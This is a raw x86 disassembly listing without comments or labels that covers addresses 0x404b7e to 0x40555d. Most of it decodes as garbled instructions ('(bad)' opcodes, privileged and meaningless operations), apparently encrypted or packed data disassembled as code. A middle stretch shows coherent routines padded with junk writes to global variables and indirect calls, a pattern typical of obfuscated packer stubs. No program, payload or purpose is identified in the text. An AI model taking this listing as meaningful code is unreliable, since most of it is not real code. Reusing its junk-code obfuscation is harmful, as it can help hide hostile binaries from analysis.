  404b7e:	pusha  
  404b7f:	mov    eax,ebx
  404b81:	cdq    
  404b82:	add    DWORD PTR [ebx+0x74b16fc],edi
  404b88:	popf   
  404b89:	inc    esi
  404b8a:	and    al,0xaf
  404b8c:	les    edi,FWORD PTR [ebx+0x55]
  404b8f:	adc    al,0x59
  404b91:	dec    esi
  404b92:	jle    0x404bcc
  404b94:	cwde   
  404b95:	dec    edx
  404b96:	and    DWORD PTR ds:0x7c2411c5,ebp
  404b9c:	mov    cl,0xde
  404b9e:	(bad)  
  404b9f:	shl    BYTE PTR [ecx-0x4df40040],cl
  404ba5:	xor    BYTE PTR [ebp-0x3e1a9509],0x10
  404bac:	xchg   esp,eax
  404bad:	or     eax,0x4375f40b
  404bb2:	test   eax,esi
  404bb4:	push   ss
  404bb5:	cmp    dl,dh
  404bb7:	mov    ebp,edi
  404bb9:	lea    eax,[esi-0x3f2ed0d1]
  404bbf:	scas   eax,DWORD PTR es:[edi]
  404bc0:	fistp  DWORD PTR [edx-0x6b046529]
  404bc6:	ret    
  404bc7:	mov    cl,0x66
  404bc9:	jae    0x404be2
  404bcb:	imul   eax,DWORD PTR [esi+0x3e],0x75
  404bcf:	and    BYTE PTR [ebx],bh
  404bd1:	fcmovu st,st(4)
  404bd3:	or     BYTE PTR [ecx+0x55],bl
  404bd6:	(bad)  
  404bd7:	adc    BYTE PTR [ebp+ecx*4+0x773bd0b7],cl
  404bde:	jno    0x404b66
  404be0:	ds jne 0x404b73
  404be3:	add    eax,0x7618f957
  404be8:	cmp    DWORD PTR [edx],ecx
  404bea:	faddp  st(3),st
  404bec:	jno    0x404bfc
  404bee:	push   ebx
  404bef:	loop   0x404b9f
  404bf1:	xchg   edx,eax
  404bf2:	bound  ebp,QWORD PTR [ebx+0x1f]
  404bf5:	retf   
  404bf6:	les    eax,FWORD PTR [ebp-0x7936081f]
  404bfc:	je     0x404b89
  404bfe:	sub    esp,edx
  404c00:	pop    ss
  404c01:	cmp    eax,0xd275dd5b
  404c06:	test   DWORD PTR [ecx+0x43b3ab24],ebp
  404c0c:	xchg   bl,bl
  404c0e:	mov    cl,0x3a
  404c10:	jp     0x404c73
  404c12:	sbb    al,0x1b
  404c14:	imul   esi,ebp,0x25
  404c17:	or     ebx,DWORD PTR [edx-0x57]
  404c1a:	jae    0x404bc0
  404c1c:	or     esp,DWORD PTR [edx]
  404c1e:	xor    eax,edx
  404c20:	mov    eax,ds:0x5fc7b571
  404c25:	(bad)  
  404c26:	xchg   ecx,eax
  404c27:	and    edx,esp
  404c29:	fwait
  404c2a:	aad    0xd3
  404c2c:	and    esi,DWORD PTR [ebp-0x55]
  404c2f:	mov    ch,0x9a
  404c31:	xchg   BYTE PTR [edi+ebp*2+0x2f66e80b],bl
  404c38:	sbb    esp,DWORD PTR [edi+0x3f]
  404c3b:	in     eax,0xef
  404c3d:	icebp  
  404c3e:	les    ebp,FWORD PTR [edx]
  404c40:	xchg   esp,eax
  404c41:	jmp    esp
  404c43:	ret    
  404c44:	loopne 0x404c2d
  404c46:	cmp    esp,DWORD PTR [ebx+0x5744c61a]
  404c4c:	add    bh,BYTE PTR [ebp+0x49]
  404c4f:	fs into 
  404c51:	sahf   
  404c52:	mov    ebx,0xa5131f27
  404c57:	mov    eax,ds:0x9a9e35e8
  404c5c:	mov    bh,dh
  404c5e:	jmp    FWORD PTR [eax-0x375c6415]
  404c64:	sbb    bh,al
  404c66:	out    0x28,eax
  404c68:	call   0xc89f:0x479fb355
  404c6f:	sub    bh,BYTE PTR [edi+0x1ba62736]
  404c75:	jmp    FWORD PTR [ecx]
  404c77:	pop    ebx
  404c78:	jge    0x404c36
  404c7a:	pop    ss
  404c7b:	xor    eax,0x7d9f0776
  404c80:	sub    eax,0xbd6d8e1c
  404c85:	mov    esp,0x9bad5fc8
  404c8a:	and    BYTE PTR [edi-0x37a4b648],ah
  404c90:	inc    edi
  404c91:	mov    ecx,0xa7874cf9
  404c96:	(bad)  
  404c97:	jo     0x404c25
  404c99:	xchg   ebp,ebx
  404c9b:	rcr    DWORD PTR [eax+esi*8+0xf],cl
  404c9f:	mov    ebp,0x9b03f877
  404ca4:	std    
  404ca5:	sti    
  404ca6:	icebp  
  404ca7:	fstp   TBYTE PTR [ebp-0x40f88748]
  404cad:	out    dx,eax
  404cae:	lods   al,BYTE PTR ds:[esi]
  404caf:	sub    eax,0xdceff95b
  404cb4:	pop    edi
  404cb5:	inc    ebp
  404cb6:	dec    edi
  404cb7:	les    ecx,FWORD PTR [ebx+0x5f214f38]
  404cbd:	(bad)  
  404cbe:	das    
  404cbf:	push   0x29502f6
  404cc4:	ja     0x404cbc
  404cc6:	xchg   DWORD PTR [edi],edi
  404cc8:	clc    
  404cc9:	inc    eax
  404cca:	call   DWORD PTR [esi-0x5]
  404ccd:	dec    ebp
  404cce:	jl     0x404c90
  404cd0:	inc    esp
  404cd1:	stos   DWORD PTR es:[edi],eax
  404cd2:	push   es
  404cd3:	call   0x3fbf:0xf1deb5cc
  404cda:	dec    ebp
  404cdb:	inc    eax
  404cdc:	inc    edx
  404cdd:	stos   DWORD PTR es:[edi],eax
  404cde:	dec    ecx
  404cdf:	add    esi,DWORD PTR [ebx]
  404ce1:	test   al,0xd8
  404ce3:	pusha  
  404ce4:	icebp  
  404ce5:	test   BYTE PTR [esi-0x3a],dl
  404ce8:	aaa    
  404ce9:	jl     0x404d0c
  404ceb:	xchg   DWORD PTR [ebp+eax*8-0x2bb35927],eax
  404cf2:	mov    edi,0x47a952
  404cf7:	mov    bl,0x36
  404cf9:	imul   esi,DWORD PTR [edi+0x7ae5a2f],0x49636864
  404d03:	mov    al,0x9
  404d05:	cs fwait
  404d07:	test   eax,0x1dc69193
  404d0c:	xchg   edx,eax
  404d0d:	inc    edi
  404d0e:	or     DWORD PTR [esi+edi*4],0xffffffe9
  404d12:	push   edi
  404d13:	mov    ds:0x7e77980c,ax
  404d19:	cdq    
  404d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d1b:	sbb    cl,dl
  404d1d:	lods   al,BYTE PTR ds:[esi]
  404d1e:	cmp    BYTE PTR [eax],bh
  404d20:	lea    esp,[esi-0x75a4269c]
  404d26:	xor    ah,BYTE PTR [ebp+edx*1+0x69]
  404d2a:	mul    BYTE PTR [edi-0x53]
  404d2d:	push   esp
  404d2e:	mov    ah,0x92
  404d30:	add    ah,BYTE PTR [eax]
  404d32:	sub    cl,dl
  404d34:	jne    0x404cbb
  404d36:	cmp    DWORD PTR [ebx],esp
  404d38:	inc    esi
  404d39:	xor    DWORD PTR [edx-0x21749aee],ecx
  404d3f:	and    DWORD PTR [ecx],0x1be806a6
  404d45:	cs stos BYTE PTR es:[edi],al
  404d47:	nop
  404d48:	inc    ebp
  404d49:	push   esp
  404d4a:	fcomp  DWORD PTR [eax]
  404d4c:	adc    ecx,ecx
  404d4e:	getsec 
  404d50:	or     ebp,esi
  404d52:	sbb    dh,dl
  404d54:	mov    dh,0xa1
  404d56:	xchg   ebp,eax
  404d57:	add    edx,DWORD PTR [esi+0x6c]
  404d5a:	push   edi
  404d5b:	push   edx
  404d5c:	ja     0x404d9f
  404d5e:	faddp  st(5),st
  404d60:	iret   
  404d61:	lods   eax,DWORD PTR ds:[esi]
  404d62:	enter  0x8,0x98
  404d66:	adc    ch,BYTE PTR ds:0xed0d313a
  404d6c:	mov    ebx,0x1e936b
  404d71:	mov    al,ds:0xb290194
  404d76:	mov    WORD PTR [esi-0x20e0ec1c],cs
  404d7c:	ins    DWORD PTR es:[edi],dx
  404d7d:	icebp  
  404d7e:	fmulp  st(5),st
  404d80:	jnp    0x404d82
  404d82:	add    DWORD PTR [eax+0x1823f25f],edi
  404d88:	mov    bh,0x4c
  404d8a:	push   edi
  404d8b:	test   al,0x6a
  404d8d:	pop    es
  404d8e:	add    ch,bl
  404d90:	dec    edi
  404d91:	fst    QWORD PTR [esi+0x12]
  404d94:	cmp    cl,bl
  404d96:	add    al,0xab
  404d98:	xchg   BYTE PTR [ecx],ch
  404d9a:	mov    eax,ds:0x27967527
  404d9f:	xor    DWORD PTR [edi+0x51],ebp
  404da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da3:	rcl    DWORD PTR [esi-0x75],0x8b
  404da7:	loopne 0x404d90
  404da9:	mov    bl,0x1d
  404dab:	jg     0x404ddd
  404dad:	xchg   esp,eax
  404dae:	js     0x404d68
  404db0:	jmp    DWORD PTR [edi+0x4fde5bb6]
  404db6:	push   edx
  404db7:	ja     0x404dc3
  404db9:	lods   eax,DWORD PTR ds:[esi]
  404dba:	mov    DWORD PTR [esi+0x5a29c6cc],ecx
  404dc0:	or     eax,0xd66c08e4
  404dc5:	adc    ebx,DWORD PTR [eax+0x4fcfc40c]
  404dcb:	outs   dx,BYTE PTR ds:[esi]
  404dcc:	mov    dl,0xa3
  404dce:	xchg   ecx,eax
  404dcf:	sub    al,BYTE PTR [eax-0x7bfad936]
  404dd5:	push   0xffffffbc
  404dd7:	add    bh,BYTE PTR [edi+ebx*4-0x43]
  404ddb:	adc    eax,0x80764281
  404de0:	inc    eax
  404de1:	iret   
  404de2:	adc    eax,0x3ae8da68
  404de7:	lods   al,BYTE PTR ds:[esi]
  404de8:	cs xchg ecx,eax
  404dea:	scas   al,BYTE PTR es:[edi]
  404deb:	mov    al,0x19
  404ded:	add    BYTE PTR [edx+0x35],dh
  404df0:	inc    edi
  404df1:	mov    esi,0xd6fc63df
  404df6:	enter  0x3c9f,0xfe
  404dfa:	in     al,dx
  404dfb:	outs   dx,BYTE PTR ds:[esi]
  404dfc:	outs   dx,BYTE PTR ds:[esi]
  404dfd:	jp     0x404e2d
  404dff:	and    DWORD PTR [edi+0x5d5aeee1],edi
  404e05:	inc    ecx
  404e06:	push   ds
  404e07:	cwde   
  404e08:	fdivrp st(3),st
  404e0a:	inc    esi
  404e0b:	jno    0x404e3a
  404e0d:	je     0x404dc6
  404e0f:	push   esp
  404e10:	push   es
  404e11:	mov    eax,ds:0x1822b669
  404e16:	scas   eax,DWORD PTR es:[edi]
  404e17:	or     ebx,DWORD PTR [ebp-0x155277a]
  404e1d:	(bad)  
  404e1e:	sbb    eax,0x42e1a094
  404e23:	xchg   edi,eax
  404e24:	mov    ch,BYTE PTR [esi-0x5c]
  404e27:	test   BYTE PTR [eax-0x7fd1cd4a],ah
  404e2d:	fmul   DWORD PTR [edx-0x2906ed9c]
  404e33:	dec    eax
  404e34:	inc    esi
  404e35:	in     eax,dx
  404e36:	inc    esp
  404e37:	push   eax
  404e38:	outs   dx,BYTE PTR ds:[esi]
  404e39:	gs mov edx,0x222e82d6
  404e3f:	loop   0x404e6d
  404e41:	xchg   DWORD PTR [edx],ecx
  404e43:	rol    BYTE PTR [edi-0x34c5761a],0x11
  404e4a:	lods   eax,DWORD PTR ds:[esi]
  404e4b:	rol    ch,cl
  404e4d:	or     DWORD PTR [ecx+esi*1-0x577c36d],esp
  404e54:	mov    eax,ds:0x11c4b055
  404e59:	stos   BYTE PTR es:[edi],al
  404e5a:	(bad)  
  404e5c:	mov    edx,0x31ef737d
  404e61:	or     ebx,DWORD PTR [ebx+0x16cfc28c]
  404e67:	xlat   BYTE PTR ds:[ebx]
  404e68:	jo     0x404df0
  404e6a:	in     al,0xbc
  404e6c:	jno    0x404e46
  404e6e:	inc    edx
  404e6f:	mov    eax,ss:0x4a0a7249
  404e75:	enter  0x2463,0x1d
  404e79:	cdq    
  404e7a:	sbb    edx,edi
  404e7c:	pop    DWORD PTR [ebp-0xfc66bc5]
  404e82:	sti    
  404e83:	sbb    DWORD PTR [edx],ecx
  404e85:	xchg   ebp,eax
  404e86:	dec    eax
  404e87:	lea    esi,[eax]
  404e89:	shl    DWORD PTR es:[ebx-0x4330947e],0x9
  404e91:	cdq    
  404e92:	sub    al,0xf8
  404e94:	lahf   
  404e95:	cmp    eax,DWORD PTR [ebx+0x7aedf50e]
  404e9b:	imul   BYTE PTR [esi-0x28]
  404e9e:	sbb    DWORD PTR [ebx+0x7f3e83e9],esp
  404ea4:	jo     0x404e77
  404ea6:	push   ecx
  404ea7:	mov    esi,0x26c1e1fb
  404eac:	scas   eax,DWORD PTR es:[edi]
  404ead:	mov    edx,0xa1cec8fb
  404eb2:	jae    0x404ea2
  404eb4:	mov    esi,0xe6e48277
  404eb9:	aas    
  404eba:	rol    bh,1
  404ebc:	mov    al,ds:0xa81cb6
  404ec1:	or     dl,BYTE PTR [edi+0x9]
  404ec4:	cmp    esi,DWORD PTR [ecx+ebx*4]
  404ec7:	sub    DWORD PTR [esi],0x8529db9
  404ecd:	mov    esi,esp
  404ecf:	xor    BYTE PTR [ecx],dh
  404ed1:	aaa    
  404ed2:	sub    dl,ah
  404ed4:	test   al,0x14
  404ed6:	mov    edi,0x1fa54382
  404edb:	scas   eax,DWORD PTR es:[edi]
  404edc:	jl     0x404e87
  404ede:	add    eax,0xff1b243a
  404ee3:	call   0x580da04c
  404ee8:	clc    
  404ee9:	cli    
  404eea:	aam    0xce
  404eec:	adc    esi,DWORD PTR cs:[ebx-0x3f]
  404ef0:	mov    dh,0x6e
  404ef2:	inc    esi
  404ef3:	scas   al,BYTE PTR es:[edi]
  404ef4:	rcr    BYTE PTR [edi-0x3eebd86b],1
  404efa:	mov    ebp,0xfef51ba8
  404eff:	retf   0x6dd0
  404f02:	sar    DWORD PTR [edi],cl
  404f04:	sbb    al,0x47
  404f06:	mov    eax,ds:0x50cc5988
  404f0b:	mov    bl,0xa2
  404f0d:	in     eax,dx
  404f0e:	int    0x54
  404f10:	sbb    ecx,eax
  404f12:	cmp    al,0x5c
  404f14:	xchg   ebx,eax
  404f15:	call   0xeace:0x24229471
  404f1c:	sahf   
  404f1d:	add    esp,0x35
  404f20:	js     0x404eb3
  404f22:	jl     0x404f4b
  404f24:	aam    0x21
  404f26:	push   cs
  404f27:	adc    ebx,ebp
  404f29:	push   eax
  404f2a:	cmp    al,dh
  404f2c:	or     edx,DWORD PTR [ebp-0x1c]
  404f2f:	sbb    DWORD PTR ds:0x42825b,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428267
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42837b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428357,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428363,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428363,0x0
  404f72:	mov    DWORD PTR ds:0x4282f3,ebx
  404f78:	mov    DWORD PTR ds:0x42836b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42824b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42821f,ebx
  404f97:	mov    DWORD PTR ds:0x428257,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428363,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d6c
  404fbc:	and    edx,DWORD PTR ds:0x428303
  404fc2:	sub    DWORD PTR ds:0x42822f,ecx
  404fc8:	or     DWORD PTR ds:0x428223,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42815f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428343
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42814b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428143
  404ff2:	xor    DWORD PTR ds:0x428283,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428257
  404ffe:	add    DWORD PTR ds:0x42837b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x428283
  40500c:	add    DWORD PTR ds:0x42825b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428363,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42836f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428157,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42837f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42826f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428163,0x428247
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42835b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42836b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42825b,0x428367
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428253,0x428273
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428227,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42835b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42836b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428377,0x42821b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428243,0x42822f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42827f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42825f,0x42823b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428147,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42836b,0x0
  40512f:	mov    DWORD PTR ds:0x42817b,edx
  405135:	mov    DWORD PTR ds:0x42834b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42815b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42836b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427f8c
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428d94
  40516c:	or     DWORD PTR ds:0x428253,0xa87
  405176:	add    ecx,DWORD PTR ds:0x428387
  40517c:	adc    ecx,DWORD PTR ds:0x42816b
  405182:	xor    DWORD PTR ds:0x42815b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42826f,edx
  405192:	cmp    DWORD PTR ds:0x4282cb,0x0
  405199:	mov    DWORD PTR ds:0x4282f7,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282d7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282cb,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428d98
  4051d1:	inc    DWORD PTR ds:0x428267
  4051d7:	mov    ecx,DWORD PTR ds:0x4281a7
  4051dd:	mov    edx,DWORD PTR ds:0x4283a7
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282cb,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x42819f
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428253,edx
  405201:	mov    edx,DWORD PTR ds:0x4281b7
  405207:	mov    ecx,DWORD PTR ds:0x4283a7
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42835f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42826f
  405233:	sub    DWORD PTR ds:0x428173,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42834b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428157,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42825f,0x428163
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42837b,0x428247
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428373,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42814b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x428283,0x0
  40529a:	mov    DWORD PTR ds:0x428213,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428253
  4052aa:	mov    DWORD PTR ds:0x4282db,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x428383,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42826b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x428283,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428049
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428d9c
  4052ea:	add    edx,DWORD PTR ds:0x42823b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428163
  4052fc:	and    DWORD PTR ds:0x42816f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428247
  40530f:	add    DWORD PTR ds:0x428283,edx
  405315:	mov    edx,DWORD PTR ds:0x42826b
  40531b:	add    DWORD PTR ds:0x428153,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282d7,0x42820f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x4282f3,0x0
  40533c:	mov    DWORD PTR ds:0x4282ef,edi
  405342:	mov    DWORD PTR ds:0x428257,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x4282fb,0x4d36
  405357:	mov    DWORD PTR ds:0x428377,0x1e95
  405361:	cmp    DWORD PTR ds:0x4282f3,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428da0
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42837f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x4283bf
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42835f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42822f
  40539c:	xor    DWORD PTR ds:0x42813b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42825b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282db,0x0
  4053b5:	mov    DWORD PTR ds:0x428147,edi
  4053bb:	not    DWORD PTR ds:0x42821b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428177,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282db,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428da4
  4053f6:	sub    ecx,DWORD PTR ds:0x42817b
  4053fc:	sub    DWORD PTR ds:0x42821b,0x6432
  405406:	or     DWORD PTR ds:0x42823f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42816f
  405416:	sub    DWORD PTR ds:0x428373,edi
  40541c:	mov    DWORD PTR ds:0x42821b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428257,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282cf,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42837f
  405450:	sub    edx,DWORD PTR ds:0x428133
  405456:	mov    DWORD PTR ds:0x42837f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	xor    BYTE PTR [eax-0x46198f65],bh
  405473:	sbb    BYTE PTR [eax],bl
  405475:	sahf   
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    BYTE PTR [edi],bl
  40547a:	pop    edi
  40547b:	sub    BYTE PTR [eax],dh
  40547d:	pop    ss
  40547e:	(bad)
  405482:	sub    ebx,ebp
  405484:	lea    edx,[ebp-0x78]
  405487:	mov    ecx,0xeaee2177
  40548c:	test   DWORD PTR [edx-0xf],eax
  40548f:	data16 xlat BYTE PTR ds:[ebx]
  405491:	push   edx
  405492:	mov    ebp,0x9279329f
  405497:	xor    dl,BYTE PTR [edx]
  405499:	cmp    eax,0xebf7b1ea
  40549e:	arpl   WORD PTR [ebp+0x21],ax
  4054a1:	mov    ecx,0x7c81d6db
  4054a6:	in     al,0x38
  4054a8:	repz std 
  4054aa:	cmp    BYTE PTR [eax],bh
  4054ac:	xlat   BYTE PTR ds:[ebx]
  4054ad:	repnz xor BYTE PTR [ecx],ch
  4054b0:	add    eax,0xe1107d63
  4054b5:	in     al,0x7c
  4054b7:	test   DWORD PTR [edx-0x45],esp
  4054ba:	popa   
  4054bb:	inc    edi
  4054bc:	xor    BYTE PTR [edx+0x6b55cf0d],dl
  4054c2:	push   edi
  4054c3:	dec    ebp
  4054c4:	daa    
  4054c5:	mov    BYTE PTR [edi+0x5e],dl
  4054c8:	cmp    eax,0x934e120f
  4054cd:	icebp  
  4054ce:	div    ecx
  4054d0:	es dec ebp
  4054d2:	mov    bl,0x94
  4054d4:	cmp    eax,0x128f4459
  4054d9:	(bad)  
  4054da:	jne    0x4054ee
  4054dc:	pop    es
  4054dd:	rcl    ebp,cl
  4054df:	inc    edx
  4054e0:	fdiv   QWORD PTR [edx]
  4054e2:	or     ah,al
  4054e4:	das    
  4054e5:	jmp    0x405469
  4054e7:	imul   ecx,DWORD PTR [edi]
  4054ea:	div    ecx
  4054ec:	push   esp
  4054ed:	out    dx,eax
  4054ee:	aaa    
  4054ef:	int3   
  4054f0:	sbb    ah,BYTE PTR [edx+0x73fb990a]
  4054f6:	aaa    
  4054f7:	adc    DWORD PTR [ebx+0x30],0x9a82e309
  4054fe:	pop    ss
  4054ff:	fmul   QWORD PTR [ecx-0xf]
  405502:	xlat   BYTE PTR ds:[ebx]
  405503:	fsubr  DWORD PTR es:[edx-0x34ca14d0]
  40550a:	sbb    DWORD PTR [edi],edi
  40550c:	sub    ebp,DWORD PTR [eax]
  40550e:	inc    edi
  40550f:	mov    eax,ds:0xeaa34dc
  405514:	lahf   
  405515:	mov    ds:0x8bef6712,al
  40551a:	mov    eax,0x1fd06e48
  40551f:	fldenv [edi-0x112a5ef2]
  405525:	out    dx,al
  405526:	jp     0x4054f0
  405528:	sub    esp,DWORD PTR [esi+0x19]
  40552b:	mov    al,0x2e
  40552d:	loop   0x4054f7
  40552f:	jmp    0x74b96c5c
  405534:	mov    esp,0xd84f25c7
  405539:	add    al,0x87
  40553b:	fidivr DWORD PTR [edi+0x2c]
  40553e:	int    0xcb
  405540:	inc    esi
  405541:	(bad)  
  405544:	sar    bh,1
  405546:	push   eax
  405547:	aas    
  405548:	adc    al,0x14
  40554a:	stos   DWORD PTR es:[edi],eax
  40554b:	sti    
  40554c:	neg    BYTE PTR [edx+ebp*2]
  40554f:	sbb    dh,BYTE PTR [edx]
  405551:	sbb    eax,0xa008f810
  405556:	mov    ch,BYTE PTR [ecx+0x523e8568]
  40555c:	aas    
  40555d:	mov    WORD PTR [edx+0x7c1897d8],gs
